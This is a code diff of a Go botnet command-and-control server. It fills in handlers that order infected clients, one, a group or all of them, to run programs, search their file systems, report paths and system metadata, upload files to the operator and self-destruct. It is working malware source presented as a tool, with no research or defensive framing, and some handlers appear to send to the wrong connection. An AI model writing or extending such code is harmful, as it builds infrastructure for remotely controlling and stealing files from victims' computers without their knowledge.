@@ -8,7 +8,7 @@ import (
 
 /*
 *All the commands that the botnet can run
- */
+*/
 
 //*Shows number of all active connection to server
 func (s *Server)ShowActiveConns(){
@@ -152,30 +152,53 @@ func (s *Server) ClientPing(addr, mode string, conn net.Conn) {
 
 //*Runs specified app on detected os by abs path on client side
 func (s *Server)ClientRunApp(app, mode string, conn net.Conn){
-	/*
-	TODO:
-	1. check mode
-	2. detect os on client
-	3. parse for file -> can run find file or implement own logic
-	4. run file
-	*/
-	if s.ActiveClient == 0{
-		if _, err := conn.Write([]byte("ping " + app)); err != nil {
-				fmt.Println(h.E, err)
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	switch{
+	
+	case mode == "-a":
+		for _, client := range s.Clients {
+			if client.ID == s.ActiveClient {
+				if _, err := conn.Write([]byte("run " + app)); err != nil {
+					fmt.Println(h.E, "Error sending run command to client", err)
+				} else {
+					fmt.Println(h.K, "Run command sent to active client", s.ActiveClient, "successfully.")
+				}
+				break
+			}
 		}
-		fmt.Println(h.K, "successful execution")
+	
+	case len(s.ClientGroup) > 0 && mode == "-g":
+		for _, client := range s.Clients {
+			for _, clientID := range s.ClientGroup {
+				if client.ID == clientID {
+					if _, err := conn.Write([]byte("run " + app)); err != nil {
+						fmt.Println(h.E, "Error sending run command to client", err)
+					} else {
+						fmt.Println(h.K, "Run command sent to client", client.ID, "successfully.")
+					}
+				}
+			}
+		}
+		fmt.Println(h.K, "Run command Sent to group successfully")
+	
+
+	default:
+		for _, client := range s.Clients {
+			if _, err := client.Conn.Write([]byte("run " + app)); err != nil {
+				fmt.Println(h.E, "Error sending run command to client", err)
+			} else {
+				fmt.Println(h.K, "Run command sent to client", client.ID, "successfully.")
+			}
+		}
 	}
 }
 
+
+
 //*Sends a file to client side
 func (s *Server)ServerSendFile(file, mode string, conn net.Conn){
-	/*
-	TODO:
-	* 1. check mode DONE
-	2. download file and make buffer for file size -> 
-	3. send file over tcp -> 
-	4. confirm that it was sent
-	*/
 	s.mu.Lock()
 	defer s.mu.Unlock()
 
@@ -221,41 +244,6 @@ func (s *Server)ServerSendFile(file, mode string, conn net.Conn){
 
 //*Searches for a file on the client side
 func (s *Server)ClientSearchFile(file, mode string, conn net.Conn){
-	/*
-	TODO:
-	1. check mode
-	2. check OS
-	3. parse through file system at entry point (use ClientEntry Point to see if we can go there)
-	4. if found print found if not print not
-	*/
-	if s.ActiveClient == 0{
-		if _, err := conn.Write([]byte("ping " + file)); err != nil {
-				fmt.Println(h.E, err)
-		}
-		fmt.Println(h.K, "successful execution")
-	}
-}
-
-//*Tells client to return the current path that they are located in
-func (s *Server)ClientEntryPoint(mode string, conn net.Conn){
-	/*
-	TODO:
-	1. check mode
-	2. check os
-	3. tell client to return their current path
-	*/
-}
-
-
-//*Downloads a file from client side to Server side
-func (s *Server)ClientDownFile(file, mode string, conn net.Conn){
-	/*
-	TODO:
-	1. check mode
-	2. check os
-	3. tell the client to send a file at specified path (use ClientSearchFile to see if exist then go there)
-	*/
-	
 	s.mu.Lock()
 	defer s.mu.Unlock()
 
@@ -264,10 +252,10 @@ func (s *Server)ClientDownFile(file, mode string, conn net.Conn){
 	case mode == "-a":
 		for _, client := range s.Clients {
 			if client.ID == s.ActiveClient {
-				if err := s.RecvFileFromClient(client); err != nil {
-					fmt.Println(h.E, "Error sending file to active client:", err)
+				if _, err := conn.Write([]byte("search " + file)); err != nil {
+					fmt.Println(h.E, "Error sending command to client", err)
 				} else {
-					fmt.Println(h.K, "File sent to active client", s.ActiveClient, "successfully.")
+					fmt.Println(h.K, "Search command sent to active client", s.ActiveClient, "successfully.")
 				}
 				break
 			}
@@ -277,23 +265,201 @@ func (s *Server)ClientDownFile(file, mode string, conn net.Conn){
 		for _, client := range s.Clients {
 			for _, clientID := range s.ClientGroup {
 				if client.ID == clientID {
-					if err := s.RecvFileFromClient(client); err != nil {
-						fmt.Println(h.E, "Error sending file to client", client.ID, ":", err)
+					if _, err := conn.Write([]byte("search " + file)); err != nil {
+						fmt.Println(h.E, "Error sending command to client", err)
 					} else {
-						fmt.Println(h.K, "File sent to client", client.ID, "successfully.")
+						fmt.Println(h.K, "Search command sent to client", client.ID, "successfully.")
+					}
+				}
+			}
+		}
+		fmt.Println(h.K, "Search command Sent to group successfully")
+	
+
+	default:
+		for _, client := range s.Clients {
+			if _, err := client.Conn.Write([]byte("search " + file)); err != nil {
+				fmt.Println(h.E, "Error sending command to client", err)
+			} else {
+				fmt.Println(h.K, "Search command sent to client", client.ID, "successfully.")
+			}
+		}
+	}	
+}
+
+//*Tells client to return the current path that they are located in
+func (s *Server)ClientEntryPoint(mode string, conn net.Conn){
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	switch{
+	
+	case mode == "-a":
+		for _, client := range s.Clients {
+			if client.ID == s.ActiveClient {
+				if _, err := client.Conn.Write([]byte("entry")); err != nil {
+					fmt.Println(h.E, "Error sending entry command to active client:", err)
+				} else {
+					fmt.Println(h.K, "entry command sent to active client", s.ActiveClient, "successfully.")
+				}
+				break
+			}
+		}
+	
+	case len(s.ClientGroup) > 0 && mode == "-g":
+		for _, client := range s.Clients {
+			for _, clientID := range s.ClientGroup {
+				if client.ID == clientID {
+					if _, err := client.Conn.Write([]byte("entry")); err != nil {
+						fmt.Println(h.E, "Error sending entry command to client", client.ID, ":", err)
+					} else {
+						fmt.Println(h.K, "entry command sent to client", client.ID, "successfully.")
+					}
+				}
+			}
+		}
+		fmt.Println(h.K, "entry command Sent to group successfully")
+	
+
+	default:
+		for _, client := range s.Clients {
+			if _, err := client.Conn.Write([]byte("entry")); err != nil {
+				fmt.Println(h.E, "Error sending entry command to client", client.ID, ":", err)
+			} else {
+				fmt.Println(h.K, "entry command sent to client", client.ID, "successfully.")
+			}
+		}
+	}
+}
+
+
+//*Downloads a file from client side to Server side
+func (s *Server)ClientDownFile(file, mode string, conn net.Conn){
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	switch{
+	
+	case mode == "-a":
+		for _, client := range s.Clients {
+			if client.ID == s.ActiveClient {
+				if err := s.RecvFileFromClient(client, file); err != nil {
+					fmt.Println(h.E, "Error sending Command to active client:", err)
+				} else {
+					fmt.Println(h.K, "Command sent to active client", s.ActiveClient, "successfully.")
+				}
+				break
+			}
+		}
+	
+	case len(s.ClientGroup) > 0 && mode == "-g":
+		for _, client := range s.Clients {
+			for _, clientID := range s.ClientGroup {
+				if client.ID == clientID {
+					if err := s.RecvFileFromClient(client, file); err != nil {
+						fmt.Println(h.E, "Error sending Command to client", client.ID, ":", err)
+					} else {
+						fmt.Println(h.K, "Command sent to client", client.ID, "successfully.")
 					}
 				}
 			}
 		}
 		fmt.Println(h.K, "File Sent to group successfully")
-	
 
 	default:
 		for _, client := range s.Clients {
-			if err := s.RecvFileFromClient(client); err != nil {
-				fmt.Println(h.E, "Error sending file to client", client.ID, ":", err)
+			if err := s.RecvFileFromClient(client, file); err != nil {
+				fmt.Println(h.E, "Error sending Command to client", client.ID, ":", err)
 			} else {
-				fmt.Println(h.K, "File sent to client", client.ID, "successfully.")
+				fmt.Println(h.K, "Command sent to client", client.ID, "successfully.")
+			}
+		}
+	}
+}
+
+//*Disconnects a clients connection to the server
+func (s *Server)ClientSelfDestruct(mode string, conn net.Conn){
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	switch{
+	
+	case mode == "-a":
+		for _, client := range s.Clients {
+			if client.ID == s.ActiveClient {
+				if _, err := client.Conn.Write([]byte("blowup")); err != nil {
+					fmt.Println(h.E, "Error sending blowup command to active client:", err)
+				} else {
+					fmt.Println(h.K, "blowup command sent to active client", s.ActiveClient, "successfully.")
+				}
+				break
+			}
+		}
+	
+	case len(s.ClientGroup) > 0 && mode == "-g":
+		for _, client := range s.Clients {
+			for _, clientID := range s.ClientGroup {
+				if client.ID == clientID {
+					if _, err := client.Conn.Write([]byte("blowup")); err != nil {
+						fmt.Println(h.E, "Error sending blowup command to client", client.ID, ":", err)
+					} else {
+						fmt.Println(h.K, "blowup command sent to client", client.ID, "successfully.")
+					}
+				}
+			}
+		}
+		fmt.Println(h.K, "blowup command Sent to group successfully")
+
+	default:
+		for _, client := range s.Clients {
+			if _, err := client.Conn.Write([]byte("blowup")); err != nil {
+				fmt.Println(h.E, "Error sending blowup command to client", client.ID, ":", err)
+			} else {
+				fmt.Println(h.K, "blowup command sent to client", client.ID, "successfully.")
+			}
+		}
+	}
+}
+
+//*Returns metadata of client: operating system, connection, id
+func (s *Server) GetMetaData(mode string, conn net.Conn){
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	switch{
+	
+	case mode == "-a":
+		for _, client := range s.Clients {
+			if client.ID == s.ActiveClient {
+				if _, err := client.Conn.Write([]byte("metadata")); err != nil {
+					fmt.Println(h.E, "Error sending metadata command to active client:", err)
+				} else {
+					fmt.Println(h.K, "metadata command sent to active client", s.ActiveClient, "successfully.")
+				}
+				break
+			}
+		}
+	
+	case len(s.ClientGroup) > 0 && mode == "-g":
+		for _, client := range s.Clients {
+			for _, clientID := range s.ClientGroup {
+				if client.ID == clientID {
+					if _, err := client.Conn.Write([]byte("metadata")); err != nil {
+						fmt.Println(h.E, "Error sending metadata command to client", client.ID, ":", err)
+					} else {
+						fmt.Println(h.K, "metadata command sent to client", client.ID, "successfully.")
+					}
+				}
+			}
+		}
+		fmt.Println(h.K, "metadata command Sent to group successfully")
+
+	default:
+		for _, client := range s.Clients {
+			if _, err := client.Conn.Write([]byte("metadata")); err != nil {
+				fmt.Println(h.E, "Error sending metadata command to client", client.ID, ":", err)
+			} else {
+				fmt.Println(h.K, "metadata command sent to client", client.ID, "successfully.")
 			}
 		}
 	}
